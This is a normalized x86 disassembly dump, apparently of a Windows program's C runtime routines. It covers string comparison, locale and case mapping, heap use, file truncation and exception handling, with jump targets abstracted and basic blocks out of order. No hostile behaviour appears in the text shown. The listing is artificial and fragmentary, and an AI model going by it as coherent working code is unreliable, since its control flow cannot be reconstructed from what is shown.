and eax 0x2
je r-xdata
movzx ecx bl
movzx ecx [ esi + ecx * 2 ]
test cl 0x4
je r-xdata
or [ ebp + 0x18 ] 0x4
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp ecx edx
jbe r-xdata
test [ ebp + 0x18 ] 0x2
je r-xdata
mov [ eax ] edi
test eax eax
jne r-xdata
cmp [ ebp - 0x4 ] 0x80000000
ja r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
neg [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] esi
jbe r-xdata
mov eax [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp - 0xc ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
sub_40eb68
mov edi edi
push ebp
mov ebp esp
xor eax eax
push eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_40e939
add esp 0x14
pop ebp
retn
sub_40eb93
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor ebx ebx
push 0x1
push ebx
push ebx
push [ ebp + 0x8 ]
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
call sub_40b44f
mov [ ebp - 0x18 ] eax
and eax edx
add esp 0x10
mov [ ebp - 0x14 ] edx
cmp eax 0xffffffff
je r-xdata
call sub_405ca6
mov eax [ eax ]
push 0x2
push ebx
push ebx
push [ ebp + 0x8 ]
call sub_40b44f
mov ecx eax
and ecx edx
add esp 0x10
cmp ecx 0xffffffff
je r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x10 ]
sub esi eax
sbb edi edx
js r-xdata
cmp edi ebx
jg r-xdata
jg r-xdata
push ebx
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
push [ ebp + 0x8 ]
call sub_40b44f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
jl r-xdata
mov ebx 0x1000
push ebx
push 0x8
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
cmp esi ebx
jbe r-xdata
xor eax eax
jmp r-xdata
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40b44f
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp esi ebx
jae r-xdata
push 0x8000
push [ ebp + 0x8 ]
call sub_40ed49
pop ecx
pop ecx
mov [ ebp - 0x8 ] eax
call sub_405ca6
mov [ eax ] 0xc
pop edi
pop esi
pop ebx
leave
retn
push [ ebp + 0x8 ]
call sub_40691e
pop ecx
push eax
call [ SetEndOfFile@IAT ]
neg eax
sbb eax eax
neg eax
dec eax
cdq
mov [ ebp - 0x10 ] eax
and eax edx
mov [ ebp - 0xc ] edx
cmp eax 0xffffffff
jne r-xdata
mov eax esi
jg r-xdata
call sub_405ca6
mov [ eax ] 0xd
call sub_405cb9
mov esi eax
call [ GetLastError@IAT ]
mov [ esi ] eax
mov esi [ ebp - 0x10 ]
call sub_405cb9
cmp [ eax ] 0x5
jne r-xdata
cdq
sub esi eax
sbb edi edx
js r-xdata
mov eax ebx
jmp r-xdata
cmp esi ebx
jb r-xdata
or esi 0xffffffff
mov [ ebp - 0xc ] esi
jmp r-xdata
call sub_405ca6
mov [ eax ] 0xd
mov esi [ ebp - 0x10 ]
jg r-xdata
push eax
push [ ebp - 0x4 ]
push [ ebp + 0x8 ]
call sub_406008
add esp 0xc
cmp eax 0xffffffff
je r-xdata
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call sub_40ed49
pop ecx
pop ecx
push [ ebp - 0x4 ]
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
xor ebx ebx
jmp r-xdata
and esi [ ebp - 0xc ]
cmp esi 0xffffffff
je r-xdata
test edi edi
jl r-xdata
test esi esi
ja r-xdata
sub_40ed49
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov eax esi
sar eax 0x5
lea edx [ eax * 4 + rw-data ]
mov eax [ edx ]
and esi 0x1f
shl esi 0x6
lea ecx [ eax + esi ]
mov al [ ecx + 0x24 ]
add al al
push edi
movzx edi [ ecx + 0x4 ]
movsx eax al
and edi 0x80
sar eax 0x1
cmp ebx 0x4000
je r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
and [ ecx ] 0x80
cmp ebx 0x8000
je r-xdata
neg eax
sbb eax eax
and eax 0xc000
add eax 0x4000
pop ebp
retn
mov eax 0x8000
pop ebp
retn
and [ ecx + 0x4 ] 0x7f
jmp r-xdata
cmp ebx 0x10000
je r-xdata
test edi edi
pop edi
pop esi
pop ebx
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x82
or dl 0x2
jmp r-xdata
cmp ebx 0x20000
je r-xdata
mov [ ecx ] dl
jmp r-xdata
cmp ebx 0x40000
jne r-xdata
or [ ecx + 0x4 ] 0x80
mov ecx [ edx ]
lea ecx [ ecx + esi + 0x24 ]
mov dl [ ecx ]
and dl 0x81
or dl 0x1
sub_40ee05
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
cmp eax esi
jne r-xdata
mov ecx [ rw-data ]
mov [ eax ] ecx
xor eax eax
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
push 0x16
pop eax
jmp r-xdata
pop esi
pop ebp
retn
sub_40ee3e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push esi
push edi
cmp [ ebp + 0x10 ] ebx
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
cmp [ ebp + 0x8 ] ebx
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
mov esi 0x7fffffff
cmp [ ebp + 0x10 ] esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] ebx
jne r-xdata
call sub_405ca6
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
cmp [ ebp - 0x4 ] bl
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_40f3da
inc [ ebp + 0x8 ]
mov esi eax
movzx eax [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_40f3da
add esp 0x10
inc edi
dec [ ebp + 0x10 ]
je r-xdata
push [ ebp + 0x10 ]
push edi
push [ ebp + 0x8 ]
call sub_40f4f0
add esp 0xc
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub esi eax
mov eax esi
jmp r-xdata
cmp esi ebx
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp esi eax
je r-xdata
sub_40ef30
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40ee3e
add esp 0x10
cmp [ ebp + 0x8 ] esi
jne r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
cmp [ ebp + 0x10 ] 0x7fffffff
ja r-xdata
pop esi
pop ebp
retn
pop esi
pop ebp
jmp sub_40f4f0
sub_40ef8e
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_40d6e4
test eax eax
je r-xdata
push 0xa
call sub_409fe1
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_40d6f1
pop ecx
push 0x3
call sub_409f5f
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_4046e0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_40f0a5
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_40f0e3
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
push 0x1004
push [ ebp + 0x8 ]
mov [ ebp - 0x6 ] 0x0
call [ GetLocaleInfoA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
call sub_40f30c
pop ecx
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4045c5
leave
retn
sub_40f12c
mov edi edi
push ebp
mov ebp esp
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x18 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp + 0x14 ]
push ebx
mov [ ebp - 0x30 ] eax
mov eax [ eax ]
push esi
mov [ ebp - 0x24 ] eax
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov [ ebp - 0x34 ] ecx
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x2c ] edi
cmp eax [ ebp + 0xc ]
je r-xdata
mov eax [ ebp - 0x20 ]
mov esi [ GetCPInfo@IAT ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
call esi
mov ebx [ MultiByteToWideChar@IAT ]
test eax eax
je r-xdata
push edi
push edi
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
mov esi eax
cmp esi edi
jne r-xdata
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
mov [ ebp - 0x1c ] edi
cmp esi 0x7ffffff0
ja r-xdata
lea esp [ ebp - 0x40 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4045c5
leave
retn
cmp [ ebp - 0x18 ] 0x1
jne r-xdata
lea eax [ esi + esi ]
push eax
push edi
push [ ebp - 0x1c ]
call sub_4046e0
add esp 0xc
push esi
push [ ebp - 0x1c ]
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push 0x1
push [ ebp + 0x8 ]
call ebx
test eax eax
je r-xdata
lea eax [ esi + esi + 0x8 ]
cmp eax 0x400
ja r-xdata
mov esi [ ebp - 0x24 ]
mov [ ebp - 0x2c ] 0x1
cmp esi 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
call sub_40df67
pop ecx
mov ebx [ ebp - 0x34 ]
cmp ebx edi
je r-xdata
push eax
call sub_4050ad
pop ecx
cmp eax edi
je r-xdata
call sub_40f2e0
mov eax esp
cmp eax edi
je r-xdata
cmp esi edi
push [ ebp - 0x28 ]
call sub_405460
mov esi eax
pop ecx
inc esi
mov ebx [ WideCharToMultiByte@IAT ]
cmp [ ebp - 0x2c ] edi
jne r-xdata
push edi
push edi
push [ ebp + 0x1c ]
push ebx
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push esi
push 0x1
call sub_40aa2f
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
cmp eax edi
je r-xdata
push edi
push edi
push edi
push edi
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
mov esi eax
cmp esi edi
je r-xdata
mov [ ebp - 0x20 ] ebx
jmp r-xdata
cmp [ ebp - 0x1c ] edi
je r-xdata
add eax 0x8
push edi
push edi
push esi
push eax
push esi
push [ ebp - 0x1c ]
push edi
push [ ebp + 0xc ]
call ebx
cmp eax edi
jne r-xdata
cmp [ ebp - 0x24 ] 0xffffffff
je r-xdata
push [ ebp - 0x20 ]
call sub_404db5
pop ecx
mov [ ebp - 0x20 ] edi
jmp r-xdata
mov ecx [ ebp - 0x30 ]
mov [ ecx ] eax
sub_40f322
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
call sub_407138
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x1 ]
cmp eax 0x100
ja r-xdata
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40b890
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
jmp r-xdata
xor ecx ecx
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x0
inc ecx
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x8 ] al
mov [ ebp - 0x7 ] bl
mov [ ebp - 0x6 ] 0x0
pop ecx
jmp r-xdata
and eax [ ebp + 0xc ]
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx eax [ ebp - 0x4 ]
cmp [ ebp - 0xc ] al
je r-xdata
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x14 ]
push [ eax + 0x4 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x18 ]
push 0x1
push eax
call sub_40e52b
add esp 0x20
test eax eax
jne r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
sub_40f3da
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_407138
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_405ca6
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_40b890
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_40f322
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_40e32c
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40f4f0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
or ecx ecx
je r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov esi [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov bh 0x41
mov bl 0x5a
mov dh 0x20
lea ecx [ ecx ]
xor ecx ecx
cmp ah al
je r-xdata
or al al
je r-xdata
mov ecx 0xffffffff
jb r-xdata
add esi 0x1
add edi 0x1
cmp ah bh
jb r-xdata
neg ecx
cmp al bh
jb r-xdata
cmp ah bl
ja r-xdata
cmp ah al
jne r-xdata
cmp al bl
ja r-xdata
add ah dh
sub ecx 0x1
jne r-xdata
add al dh
mov ah [ esi ]
or ah ah
mov al [ edi ]
je r-xdata
sub_40f560
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_40f5b0
xor eax eax
mov al [ esp + 0x8 ]
push ebx
mov ebx eax
shl eax 0x8
mov edx [ esp + 0x8 ]
test edx 0x3
je r-xdata
or ebx eax
push edi
mov eax ebx
shl ebx 0x10
push esi
or ebx eax
mov cl [ edx ]
add edx 0x1
cmp cl bl
je sub_40f5a0
mov eax [ edx - 0x4 ]
cmp al bl
je r-xdata
and eax 0x81010100
je r-xdata
test cl cl
je r-xdata
lea eax [ edx - 0x4 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
mov ecx [ edx ]
mov edi 0x7efefeff
mov eax ecx
mov esi edi
xor ecx ebx
add esi eax
add edi ecx
xor ecx 0xffffffff
xor eax 0xffffffff
xor ecx edi
xor eax esi
add edx 0x4
and ecx 0x81010100
jne r-xdata
and eax 0x1010100
jne r-xdata
pop ebx
xor eax eax
retn
test edx 0x3
jne r-xdata
pop esi
pop edi
cmp ah bl
je r-xdata
and esi 0x80000000
jne r-xdata
lea eax [ edx - 0x3 ]
pop esi
pop edi
pop ebx
retn
test ah ah
je r-xdata
shr eax 0x10
cmp al bl
je r-xdata
lea eax [ edx - 0x2 ]
pop esi
pop edi
pop ebx
retn
test al al
je r-xdata
cmp ah bl
je r-xdata
pop esi
pop edi
lea eax [ edx - 0x1 ]
pop ebx
retn
test ah ah
je r-xdata
jmp r-xdata
sub_40f674
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
xor esi esi
xor eax eax
push edi
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov ebx [ ebp + 0x8 ]
cmp ebx esi
jne r-xdata
mov edi [ ebp + 0xc ]
cmp edi esi
je r-xdata
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] esi
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ ebx ]
push eax
call sub_40f804
movzx esi ax
lea eax [ ebp - 0x10 ]
push eax
movzx eax [ edi ]
push eax
call sub_40f804
add esp 0x10
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
movzx eax [ ebx ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax si
sub eax ecx
cmp [ ebp - 0x4 ] 0x0
je r-xdata
test si si
je r-xdata
movzx esi ax
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp si ax
je r-xdata
inc ebx
inc ebx
inc edi
inc edi
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
test si si
je r-xdata
add eax 0x20
cmp si ax
je r-xdata
jmp r-xdata
sub_40f75e
mov edi edi
push ebp
mov ebp esp
push esi
xor esi esi
push edi
cmp [ rw-data ] esi
jne r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40f674
add esp 0x10
xor eax eax
cmp [ ebp + 0x10 ] esi
je r-xdata
pop edi
pop esi
pop ebp
retn
mov edi [ ebp + 0x8 ]
cmp edi esi
jne r-xdata
mov edx [ ebp + 0xc ]
cmp edx esi
je r-xdata
call sub_405ca6
push esi
push esi
push esi
push esi
push esi
mov [ eax ] 0x16
call sub_405c3e
add esp 0x14
mov eax 0x7fffffff
jmp r-xdata
movzx eax [ edi ]
cmp ax 0x41
jb r-xdata
movzx ecx ax
movzx eax [ edx ]
cmp ax 0x41
jb r-xdata
cmp ax 0x5a
ja r-xdata
inc edi
inc edi
inc edx
inc edx
dec [ ebp + 0x10 ]
movzx eax ax
je r-xdata
cmp ax 0x5a
ja r-xdata
add eax 0x20
movzx edx ax
movzx eax cx
sub eax edx
jmp r-xdata
cmp cx si
je r-xdata
add eax 0x20
cmp cx ax
je r-xdata
sub_40f804
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
mov ecx eax
sub esp 0x14
cmp [ ebp + 0x8 ] cx
je r-xdata
leave
retn
push ebx
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_407138
mov ecx [ ebp - 0x14 ]
mov edx [ ecx + 0x14 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
push esi
mov eax 0x100
mov esi eax
cmp [ ebp + 0x8 ] si
pop esi
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
push [ ecx + 0x4 ]
lea ecx [ ebp - 0x4 ]
push 0x1
push ecx
push 0x1
lea ecx [ ebp + 0x8 ]
push ecx
push eax
push edx
lea eax [ ebp - 0x14 ]
push eax
call sub_40f8b9
add esp 0x20
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
push 0x1
push [ ebp + 0x8 ]
call sub_40dedd
add esp 0xc
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
movzx eax ax
jmp r-xdata
add eax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ ebp - 0x14 ]
mov ecx [ ecx + 0xcc ]
movzx ax [ ecx + eax ]
jmp r-xdata
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_40f8b9
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_407138
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_401000
retn
sub_40117a
mov eax ecx
retn
sub_401605
mov eax ecx
and [ eax ] 0x0
and [ eax + 0x4 ] 0x0
retn
sub_40160f
cmp [ ecx + 0x4 ] 0x0
jne r-xdata
retn
push 0x0
call sub_404db5
pop ecx
sub_401676
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
pop esi
retn
push r--data
push r--data
call [ GetModuleHandleA@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ esi ] eax
sub_403e1e
push [ rw-data ]
call sub_404db5
pop ecx
retn
sub_40403e
cmp [ ebp + 0x8 ] 0x0
je r-xdata
call sub_403c6e
test eax eax
jne r-xdata
push [ ebp + 0x8 ]
call [ CloseHandle@IAT ]
mov esp [ ebp - 0x18 ]
call sub_405299
retn 0x4
call sub_403d74
sub_404324
push esi
call sub_405e39
pop ecx
retn
sub_404463
push [ ebp + 0x8 ]
call sub_405e39
pop ecx
retn
sub_4045a4
push [ ebp + 0x8 ]
call sub_405e39
pop ecx
retn
sub_4045ae
mov edi edi
push ebp
mov ebp esp
push 0x40
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4044ea
add esp 0xc
pop ebp
retn
sub_404a24
push [ ebp + 0x18 ]
call sub_405e39
pop ecx
retn
sub_404a2e
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0xffffffff
push [ ebp + 0x8 ]
call sub_404998
add esp 0x14
pop ebp
retn
sub_404e0b
push 0x4
call sub_4090a1
pop ecx
retn
sub_404f87
push 0x4
call sub_4090a1
pop ecx
retn
sub_4050a4
push 0x4
call sub_4090a1
pop ecx
retn
sub_405177
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_404db5
sub_405182
mov edi edi
push esi
push 0x1
push rw-data
mov esi ecx
call sub_40a1c5
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_40519d
mov [ ecx ] r--data
jmp sub_40a23f
sub_4051cf
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_40a1e2
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_405299
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
push ecx
retn
sub_40543c
mov eax [ rw-data ]
or eax 0x1
xor ecx ecx
cmp [ rw-data ] eax
sete cl
mov eax ecx
retn
sub_40560c
call sub_409d4e
retn
sub_405612
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_4055d6
neg eax
sbb eax eax
neg eax
pop ecx
dec eax
pop ebp
retn
sub_40577d
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov ecx [ ecx ]
mov [ ebp - 0x24 ] ecx
push eax
push ecx
call sub_40abbc
pop ecx
pop ecx
retn
sub_405791
mov esp [ ebp - 0x18 ]
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x20 ] eax
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
call sub_409f84
mov [ ebp - 0x4 ] 0xfffffffe
push eax
call sub_409f5f
sub_4057b2
mov eax [ ebp - 0x20 ]
jmp sub_4057ca
sub_4057b7
xor eax eax
inc eax
retn
sub_4057ca
call sub_405299
retn
_start
call sub_40b231
jmp sub_405652
sub_405939
push [ ebp + 0x8 ]
call sub_406a35
pop ecx
retn
sub_405ac6
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_405e75
pop ecx
pop ecx
retn
sub_405af5
push 0x1
call sub_4090a1
pop ecx
retn
sub_405afe
push 0x1
call sub_405a24
pop ecx
retn
sub_405b07
mov edi edi
push ebp
mov ebp esp
